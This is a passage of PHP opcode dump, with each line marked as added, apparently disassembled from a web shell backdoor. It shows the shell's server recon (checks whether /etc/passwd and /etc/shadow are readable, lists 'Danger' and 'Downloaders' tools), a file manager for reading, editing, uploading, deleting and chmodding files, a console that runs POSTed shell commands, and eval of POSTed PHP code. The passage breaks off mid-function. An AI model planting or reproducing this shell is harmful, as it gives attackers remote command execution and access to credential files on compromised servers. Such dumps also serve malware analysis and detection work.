+DO_FCALL 
+INIT_FCALL_BY_NAME 'showSecParam'
+SEND_VAL_EX 'cURL+support'
+INIT_FCALL 'function_exists'
+SEND_VAL 'curl_version'
+DO_ICALL 
+QM_ASSIGN 'enabled'
+QM_ASSIGN 'no'
+DO_FCALL 
+INIT_FCALL 'function_exists'
+SEND_VAL 'mysql_get_client_info'
+DO_ICALL 
+INIT_FCALL_BY_NAME 'mysql_get_client_info'
+DO_FCALL 
+CONCAT 'MySql ('
+CONCAT ')'
+INIT_FCALL 'function_exists'
+SEND_VAL 'mssql_connect'
+DO_ICALL 
+OP_DATA 'MSSQL'
+INIT_FCALL 'function_exists'
+SEND_VAL 'pg_connect'
+DO_ICALL 
+OP_DATA 'PostgreSQL'
+INIT_FCALL 'function_exists'
+SEND_VAL 'oci_connect'
+DO_ICALL 
+OP_DATA 'Oracle'
+INIT_FCALL_BY_NAME 'showSecParam'
+SEND_VAL_EX 'Supported+databa'
+INIT_FCALL 'implode'
+SEND_VAL ', '
+DO_ICALL 
+DO_FCALL 
+ECHO '<br>'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'os'
+IS_EQUAL 'nix'
+INIT_FCALL_BY_NAME 'showSecParam'
+SEND_VAL_EX 'Readable /etc/passwd'
+INIT_FCALL 'is_readable'
+SEND_VAL '/etc/passwd'
+DO_ICALL 
+QM_ASSIGN 'yes <a href='#' onclick='g("FilesTools", "/etc/", "passwd")'>[view]</'
+QM_ASSIGN 'no'
+DO_FCALL 
+INIT_FCALL_BY_NAME 'showSecParam'
+SEND_VAL_EX 'Readable /etc/shadow'
+INIT_FCALL 'is_readable'
+SEND_VAL '/etc/shadow'
+DO_ICALL 
+QM_ASSIGN 'yes <a href='#' onclick='g("FilesTools", "/etc/", "shadow")'>[view]</'
+QM_ASSIGN 'no'
+DO_FCALL 
+INIT_FCALL_BY_NAME 'showSecParam'
+SEND_VAL_EX 'OS+versi'
+INIT_FCALL 'file_get_contents'
+SEND_VAL '/proc/version'
+DO_ICALL 
+DO_FCALL 
+INIT_FCALL_BY_NAME 'showSecParam'
+SEND_VAL_EX 'Distr+na'
+INIT_FCALL 'file_get_contents'
+SEND_VAL '/etc/issue.net'
+DO_ICALL 
+DO_FCALL 
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'safe_mode'
+ECHO '<br>'
+FE_RESET_R 
+FE_FETCH_R 
+INIT_FCALL 'which'
+DO_FCALL 
+INIT_FCALL_BY_NAME 'showSecParam'
+SEND_VAL_EX 'Userful'
+INIT_FCALL 'implode'
+SEND_VAL ', '
+DO_ICALL 
+DO_FCALL 
+FE_RESET_R 
+FE_FETCH_R 
+INIT_FCALL 'which'
+DO_FCALL 
+INIT_FCALL_BY_NAME 'showSecParam'
+SEND_VAL_EX 'Danger'
+INIT_FCALL 'implode'
+SEND_VAL ', '
+DO_ICALL 
+DO_FCALL 
+FE_RESET_R 
+FE_FETCH_R 
+INIT_FCALL 'which'
+DO_FCALL 
+INIT_FCALL_BY_NAME 'showSecParam'
+SEND_VAL_EX 'Downloaders'
+INIT_FCALL 'implode'
+SEND_VAL ', '
+DO_ICALL 
+DO_FCALL 
+ECHO '<br/>'
+INIT_FCALL_BY_NAME 'showSecParam'
+SEND_VAL_EX 'HDD+spac'
+INIT_FCALL 'ex'
+SEND_VAL 'df+-h'
+DO_FCALL 
+DO_FCALL 
+INIT_FCALL_BY_NAME 'showSecParam'
+SEND_VAL_EX 'Hosts'
+INIT_FCALL 'file_get_contents'
+SEND_VAL '/etc/hosts'
+DO_ICALL 
+DO_FCALL 
+INIT_FCALL_BY_NAME 'showSecParam'
+SEND_VAL_EX 'Mount+option'
+INIT_FCALL 'file_get_contents'
+SEND_VAL '/etc/fstab'
+DO_ICALL 
+DO_FCALL 
+INIT_FCALL_BY_NAME 'showSecParam'
+SEND_VAL_EX 'OS+Versi'
+INIT_FCALL 'ex'
+SEND_VAL 'ver'
+DO_FCALL 
+DO_FCALL 
+INIT_FCALL_BY_NAME 'showSecParam'
+SEND_VAL_EX 'Account+Settings'
+INIT_FCALL 'iconv'
+SEND_VAL 'CP866'
+SEND_VAL 'UTF-8'
+INIT_FCALL 'ex'
+SEND_VAL 'net+accounts'
+DO_FCALL 
+DO_ICALL 
+DO_FCALL 
+INIT_FCALL_BY_NAME 'showSecParam'
+SEND_VAL_EX 'User+Account'
+INIT_FCALL 'iconv'
+SEND_VAL 'CP866'
+SEND_VAL 'UTF-8'
+INIT_FCALL 'ex'
+SEND_VAL 'net+user'
+DO_FCALL 
+DO_ICALL 
+DO_FCALL 
+ECHO '</div>'
+INIT_FCALL 'hardfooter'
+DO_FCALL 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'trim'
+DO_ICALL 
+CONCAT '<span>'
+CONCAT ': </span>'
+INIT_FCALL 'strpos'
+SEND_VAL ' '
+DO_ICALL 
+CONCAT '<br>'
+CONCAT '<pre class=ml1>'
+CONCAT '</pre>'
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p1'
+INIT_FCALL 'urldecode'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+FETCH_W '_POST'
+ASSIGN_DIM 'p1'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+IS_EQUAL 'download'
+INIT_FCALL 'is_file'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+INIT_FCALL 'is_readable'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+INIT_FCALL 'ob_start'
+SEND_VAL 'ob_gzhandler'
+DO_ICALL 
+INIT_FCALL 'header'
+INIT_FCALL 'basename'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+CONCAT 'Content-Disposition: attachment; filename='
+DO_ICALL 
+INIT_FCALL 'function_exists'
+SEND_VAL 'mime_content_type'
+DO_ICALL 
+INIT_FCALL 'mime_content_type'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+INIT_FCALL 'header'
+CONCAT 'Content-Type: '
+DO_ICALL 
+INIT_FCALL 'header'
+SEND_VAL 'Content-Type: application/octet-stream'
+DO_ICALL 
+INIT_FCALL 'fopen'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+SEND_VAL 'r'
+DO_ICALL 
+INIT_FCALL 'fread'
+DO_ICALL 
+INIT_FCALL 'feof'
+DO_ICALL 
+INIT_FCALL 'fclose'
+DO_ICALL 
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+IS_EQUAL 'mkfile'
+INIT_FCALL 'file_exists'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+INIT_FCALL 'fopen'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+SEND_VAL 'w'
+DO_ICALL 
+FETCH_W '_POST'
+ASSIGN_DIM 'p2'
+OP_DATA 'edit'
+INIT_FCALL 'fclose'
+DO_ICALL 
+INIT_FCALL 'hardheader'
+DO_FCALL 
+ECHO '<h1>File tools</h1><div class=content>'
+INIT_FCALL 'file_exists'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+ECHO 'File+not+exi'
+INIT_FCALL 'hardfooter'
+DO_FCALL 
+RETURN 'null'
+INIT_FCALL 'posix_getpwuid'
+INIT_FCALL 'fileowner'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+DO_ICALL 
+INIT_FCALL 'fileowner'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+ASSIGN_DIM 'name'
+INIT_FCALL 'filegroup'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+ASSIGN_DIM 'name'
+INIT_FCALL 'posix_getgrgid'
+INIT_FCALL 'filegroup'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+DO_ICALL 
+INIT_FCALL 'htmlspecialchars'
+INIT_FCALL 'basename'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+DO_ICALL 
+CONCAT '<span>Name:</span> '
+CONCAT ' <span>Size:</span> '
+INIT_FCALL 'is_file'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+INIT_FCALL 'viewsize'
+INIT_FCALL 'filesize'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+DO_FCALL 
+QM_ASSIGN '-'
+CONCAT ' <span>Permission:</span> '
+INIT_FCALL 'viewpermscolor'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_FCALL 
+CONCAT ' <span>Owner/Group:</span> '
+FETCH_DIM_R 'name'
+CONCAT '/'
+FETCH_DIM_R 'name'
+CONCAT '<br>'
+INIT_FCALL 'date'
+SEND_VAL 'Y-m-d H:i:s'
+INIT_FCALL 'filectime'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+DO_ICALL 
+CONCAT '<span>Create time:</span> '
+CONCAT ' <span>Access time:</span> '
+INIT_FCALL 'date'
+SEND_VAL 'Y-m-d H:i:s'
+INIT_FCALL 'fileatime'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+DO_ICALL 
+CONCAT ' <span>Modify time:</span> '
+INIT_FCALL 'date'
+SEND_VAL 'Y-m-d H:i:s'
+INIT_FCALL 'filemtime'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+DO_ICALL 
+CONCAT '<br><br>'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p2'
+FETCH_W '_POST'
+ASSIGN_DIM 'p2'
+OP_DATA 'view'
+INIT_FCALL 'is_file'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+FE_RESET_R 
+FE_FETCH_R 
+INIT_FCALL 'urlencode'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+CONCAT '<a href=# onclick="g(null,null,''
+CONCAT '',''
+INIT_FCALL 'strtolower'
+DO_ICALL 
+CONCAT '')">'
+INIT_FCALL 'strtolower'
+DO_ICALL 
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+CONCAT '<b>[ '
+CONCAT ' ]</b>'
+CONCAT '</a> '
+ECHO '<br><br>'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+SWITCH_STRING '[' 'view':->336,' 'highlight':->372,' 'chmod':->398,' 'edit':->464,' 'hexdump':->570,' 'rename':->662,' 'touch':->704,' 'frame':->753,' ']'
+ECHO '<pre class=ml1>'
+INIT_FCALL 'fopen'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+SEND_VAL 'r'
+DO_ICALL 
+INIT_FCALL 'htmlspecialchars'
+INIT_FCALL 'fread'
+DO_ICALL 
+DO_ICALL 
+INIT_FCALL 'feof'
+DO_ICALL 
+INIT_FCALL 'fclose'
+DO_ICALL 
+ECHO '</pre>'
+INIT_FCALL 'is_readable'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+ECHO '<div class=ml1 style="background-color: #e1e1e1;color:black;">'
+INIT_FCALL 'highlight_file'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+INIT_FCALL 'str_replace'
+DO_ICALL 
+CONCAT '</div>'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p3'
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+SUB 1
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+INIT_FCALL 'pow'
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+SUB 1
+DO_ICALL 
+INIT_FCALL 'chmod'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+ECHO 'Can't set permissions!<br><script>document.mf.p3.value="";</script>'
+INIT_FCALL 'clearstatcache'
+DO_ICALL 
+INIT_FCALL 'urlencode'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+CONCAT '<script>p3_="";</script><form onsubmit="g(null,null,''
+CONCAT '',null,this.chmod.value);return false;"><input type=text name=chmod value="'
+INIT_FCALL 'substr'
+INIT_FCALL 'sprintf'
+SEND_VAL '%o'
+INIT_FCALL 'fileperms'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+DO_ICALL 
+SEND_VAL '-4'
+DO_ICALL 
+CONCAT '"><input type=submit value="submit"></form>'
+INIT_FCALL 'is_writable'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+ECHO 'File isn't writeable'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p3'
+INIT_FCALL 'filemtime'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+INIT_FCALL 'substr'
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+DO_ICALL 
+FETCH_W '_POST'
+ASSIGN_DIM 'p3'
+INIT_FCALL 'fopen'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+SEND_VAL 'w'
+DO_ICALL 
+INIT_FCALL 'fwrite'
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+DO_ICALL 
+INIT_FCALL 'fclose'
+DO_ICALL 
+ECHO 'Saved!<br><script>p3_="";</script>'
+INIT_FCALL 'touch'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+INIT_FCALL 'urlencode'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+CONCAT '<form onsubmit="g(null,null,''
+CONCAT '',null,'1'+this.text.value);return false;"><textarea name=text class=bigarea>'
+INIT_FCALL 'fopen'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+SEND_VAL 'r'
+DO_ICALL 
+INIT_FCALL 'htmlspecialchars'
+INIT_FCALL 'fread'
+DO_ICALL 
+DO_ICALL 
+INIT_FCALL 'feof'
+DO_ICALL 
+INIT_FCALL 'fclose'
+DO_ICALL 
+ECHO '</textarea><input type=submit value="submit"></form>'
+INIT_FCALL 'file_get_contents'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+INIT_FCALL 'sprintf'
+SEND_VAL 'X'
+INIT_FCALL 'ord'
+DO_ICALL 
+DO_ICALL 
+CONCAT '+'
+INIT_FCALL 'ord'
+DO_ICALL 
+SWITCH_LONG '[' '0:->609,' '9:->612,' '10:->615,' '13:->618,' ']'
+OP_DATA '+'
+OP_DATA '+'
+OP_DATA '+'
+OP_DATA '+'
+ADD 1
+INIT_FCALL 'sprintf'
+SEND_VAL 'X'
+ADD 1
+DO_ICALL 
+CONCAT '<br>'
+OP_DATA '<br>'
+OP_DATA ' '
+CONCAT '<table cellspacing=1 cellpadding=5 bgcolor=#1a1a1a><tr><td bgcolor=#202832><span style="f'
+CONCAT '</pre></span></td><td bgcolor=#060a10><pre>'
+CONCAT '</pre></td><td bgcolor=#202832><pre>'
+INIT_FCALL 'htmlspecialchars'
+DO_ICALL 
+CONCAT '</pre></td></tr></table>'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p3'
+INIT_FCALL 'rename'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+DO_ICALL 
+ECHO 'Can't rename!<br>'
+INIT_FCALL 'urlencode'
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+DO_ICALL 
+CONCAT '<script>g(null,null,"'
+CONCAT '",null,"")</script>'
+INIT_FCALL 'urlencode'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+CONCAT '<form onsubmit="g(null,null,''
+CONCAT '',null,this.name.value);return false;"><input type=text name=name value="'
+INIT_FCALL 'htmlspecialchars'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+CONCAT '"><input type=submit value="submit"></form>'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p3'
+INIT_FCALL 'strtotime'
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+DO_ICALL 
+INIT_FCALL 'touch'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+ECHO 'Fail!'
+ECHO 'Touched!'
+ECHO 'Bad time format!'
+INIT_FCALL 'clearstatcache'
+DO_ICALL 
+INIT_FCALL 'urlencode'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+CONCAT '<script>p3_="";</script><form onsubmit="g(null,null,''
+CONCAT '',null,this.touch.value);return false;"><input type=text name=touch value="'
+INIT_FCALL 'date'
+SEND_VAL 'Y-m-d H:i:s'
+INIT_FCALL 'filemtime'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+DO_ICALL 
+CONCAT '"><input type=submit value="submit"></form>'
+INIT_FCALL 'substr'
+INIT_FCALL 'htmlspecialchars'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_ICALL 
+INIT_FCALL 'htmlspecialchars'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'DOCUMENT_ROOT'
+DO_ICALL 
+DO_ICALL 
+IS_NOT_EQUAL '/'
+CONCAT '/'
+SUB 1
+IS_NOT_EQUAL '/'
+CONCAT '/'
+INIT_FCALL 'htmlspecialchars'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+CONCAT '<iframe width="100%" height="900px" scrolling="no" src='
+CONCAT ' onload="onload=height=contentDocument.body.scrollHeight"></iframe>'
+ECHO '</div>'
+INIT_FCALL 'hardfooter'
+DO_FCALL 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p1'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p2'
+INIT_FCALL 'prototype'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'stderr_to_out'
+DO_FCALL 
+FETCH_RW '_POST'
+ASSIGN_DIM_OP 'p1'
+OP_DATA ' 2>&1'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p1'
+INIT_FCALL 'prototype'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'stderr_to_out'
+DO_FCALL 
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'ajax'
+INIT_FCALL 'prototype'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'ajax'
+DO_FCALL 
+INIT_FCALL 'ob_start'
+DO_ICALL 
+ECHO 'd.cf.cmd.value=''; '
+INIT_FCALL 'iconv'
+FETCH_R '_POST'
+FETCH_DIM_R 'charset'
+SEND_VAL 'UTF-8'
+INIT_FCALL 'addcslashes'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+CONCAT ' $ '
+CONCAT ' '
+INIT_FCALL 'ex'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_FCALL 
+SEND_VAL '  \''
+DO_ICALL 
+DO_ICALL 
+INIT_FCALL 'preg_match'
+SEND_VAL '!.*cd\s+([^;]+)$!'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+INIT_FCALL 'chdir'
+DO_ICALL 
+INIT_FCALL 'getcwd'
+DO_ICALL 
+FETCH_W 'GLOBALS'
+ASSIGN_DIM 'cwd'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+CONCAT 'c_=''
+CONCAT '';'
+CONCAT 'd.cf.output.value+=''
+CONCAT '';'
+ECHO 'd.cf.output.scrollTop = d.cf.output.scrollHeight;'
+INIT_FCALL 'ob_get_clean'
+DO_ICALL 
+ECHO ' '
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'ajax'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p1'
+INIT_FCALL 'prototype'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'ajax'
+DO_FCALL 
+INIT_FCALL 'hardheader'
+DO_FCALL 
+ECHO '<script>  if(window.Event) window.captureEvents(Event.KEYDOWN);  var cmds = new Array('''
+ECHO '<h1>Console</h1><div class=content><form name=cf onsubmit="if(d.cf.cmd.value=='clear''
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'aliases'
+FE_RESET_R 
+FE_FETCH_R 
+INIT_FCALL 'htmlspecialchars'
+DO_ICALL 
+CONCAT '<optgroup label="-'
+CONCAT '-"></optgroup>'
+INIT_FCALL 'htmlspecialchars'
+DO_ICALL 
+CONCAT '<option value="'
+CONCAT '">'
+CONCAT '</option>'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'ajax'
+FETCH_R '_COOKIE'
+QM_ASSIGN 'checked'
+CONCAT '</select></label><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked)'
+CONCAT '> send using AJAX <input type=checkbox name=show_errors value=1 '
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p2'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'stderr_to_out'
+FETCH_R '_COOKIE'
+QM_ASSIGN 'checked'
+CONCAT '> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style='
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p1'
+INIT_FCALL 'htmlspecialchars'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+CONCAT '$ '
+CONCAT ' '
+INIT_FCALL 'ex'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_FCALL 
+DO_ICALL 
+ECHO '</textarea><table style="border:1px solid #060a10;background-color:#060a10;border-top:0px;'
+ECHO '</form></div><script>d.cf.cmd.focus();</script>'
+INIT_FCALL 'hardfooter'
+DO_FCALL 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'ajax'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'ajax'
+FETCH_W '_COOKIE'
+INIT_FCALL 'ob_start'
+DO_ICALL 
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+INCLUDE_OR_EVAL 'EVAL'
+INIT_FCALL 'addcslashes'
+INIT_FCALL 'htmlspecialchars'
+INIT_FCALL 'ob_get_clean'
+DO_ICALL 
+DO_ICALL 
+SEND_VAL '  \''
+DO_ICALL 
+CONCAT 'document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').inne'
+CONCAT ''; '
+ECHO ' '
+INIT_FCALL 'hardheader'
+DO_FCALL 
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p2'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+IS_EQUAL 'info'
+ECHO '<h1>PHP info</h1><div class=content>'
+INIT_FCALL 'ob_start'
+DO_ICALL 
+INIT_FCALL 'phpinfo'
+DO_ICALL 
+INIT_FCALL 'ob_get_clean'
+DO_ICALL 
+INIT_FCALL 'preg_replace'
+SEND_VAL '!body {.*}!msiU'
+DO_ICALL 
+INIT_FCALL 'preg_replace'
+SEND_VAL '!a:\w+ {.*}!msiU'
+DO_ICALL 
+INIT_FCALL 'preg_replace'
+SEND_VAL '!h1!msiU'
+SEND_VAL 'h2'
+DO_ICALL 
+INIT_FCALL 'preg_replace'
+SEND_VAL '!td, th {(.*)}!msiU'
+SEND_VAL '.e, .v, .h, .h th {$1}'
+DO_ICALL 
+INIT_FCALL 'preg_replace'
+SEND_VAL '!body, td, th, h2, h2 {.*}!msiU'
+DO_ICALL 
+ECHO '</div><br>'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'ajax'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p1'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'ajax'
+FETCH_W '_COOKIE'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p1'
+INIT_FCALL 'htmlspecialchars'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+CONCAT '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit="if(this.a'
+CONCAT '</textarea><input type=submit value=Eval style="margin-top:5px">'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'ajax'
+FETCH_R '_COOKIE'
+QM_ASSIGN 'checked'
+CONCAT ' <input type=checkbox name=ajax value=1 '
+CONCAT '> send using AJAX</form><pre id=PhpOutput style="'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p1'
+QM_ASSIGN 'display:none;'
+CONCAT 'margin-top:5px;" class=ml1>'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p1'
+INIT_FCALL 'ob_start'
+DO_ICALL 
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+INCLUDE_OR_EVAL 'EVAL'
+INIT_FCALL 'htmlspecialchars'
+INIT_FCALL 'ob_get_clean'
+DO_ICALL 
+DO_ICALL 
+ECHO '</pre></div>'
+INIT_FCALL 'hardfooter'
+DO_FCALL 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+FETCH_IS '_COOKIE'
+ISSET_ISEMPTY_DIM_OBJ 'f'
+INIT_FCALL 'unserialize'
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'f'
+DO_ICALL 
+FETCH_W '_COOKIE'
+ASSIGN_DIM 'f'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p1'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+SWITCH_STRING '[' 'uploadFile':->30,' 'mkdir':->57,' 'delete':->68,' 'paste':->102,' ']'
+FETCH_R '_FILES'
+FETCH_DIM_R 'f'
+FETCH_DIM_R 'tmp_name'
+FETCH_R '_FILES'
+FETCH_DIM_R 'f'
+FETCH_DIM_R 'tmp_name'
+FE_RESET_R 
+FE_FETCH_R 
+INIT_FCALL 'move_uploaded_file'
+FETCH_R '_FILES'
+FETCH_DIM_R 'f'
+FETCH_DIM_R 'name'
+DO_ICALL 
+ECHO 'Can't upload file!'
+INIT_FCALL 'mkdir'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+DO_ICALL 
+ECHO 'Can't create new dir'
+DECLARE_FUNCTION 'deletedir'
+FETCH_R '_POST'
+FETCH_DIM_R 'f'
+FETCH_R '_POST'
+FETCH_DIM_R 'f'
+FE_RESET_R 
+FE_FETCH_R 
+IS_EQUAL '..'
+INIT_FCALL 'urldecode'
+DO_ICALL 
+INIT_FCALL 'is_dir'
+DO_ICALL 
+INIT_FCALL_BY_NAME 'deleteDir'
+DO_FCALL 
+INIT_FCALL 'unlink'
+DO_ICALL 
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'act'
+IS_EQUAL 'copy'
+DECLARE_FUNCTION 'copy_paste'
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'f'
+FE_RESET_R 
+FE_FETCH_R 
+INIT_FCALL_BY_NAME 'copy_paste'
+FETCH_FUNC_ARG '_COOKIE'
+FETCH_DIM_FUNC_ARG 'c'
+FETCH_FUNC_ARG 'GLOBALS'
+FETCH_DIM_FUNC_ARG 'cwd'
+DO_FCALL 
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'act'
+IS_EQUAL 'move'
+DECLARE_FUNCTION 'move_paste'
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'f'
+FE_RESET_R 
+FE_FETCH_R 
+INIT_FCALL 'rename'
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'c'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_ICALL 
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'act'
+IS_EQUAL 'zip'
+INIT_FCALL 'class_exists'
+SEND_VAL 'ZipArchive'
+DO_ICALL 
+NEW 'ZipArchive'
+DO_FCALL 
+INIT_METHOD_CALL 'open'
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'p2'
+DO_FCALL 
+INIT_FCALL 'chdir'
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'c'
+DO_ICALL 
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'f'
+FE_RESET_R 
+FE_FETCH_R 
+IS_EQUAL '..'
+INIT_FCALL 'is_file'
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'c'
+DO_ICALL 
+INIT_METHOD_CALL 'addFile'
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'c'
+DO_FCALL 
+INIT_FCALL 'is_dir'
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'c'
+DO_ICALL 
+NEW 'RecursiveIteratorIterator'
+NEW 'RecursiveDirectoryIterator'
+CONCAT '/'
+DO_FCALL 
+DO_FCALL 
+FE_RESET_R 
+FE_FETCH_R 
+INIT_METHOD_CALL 'addFile'
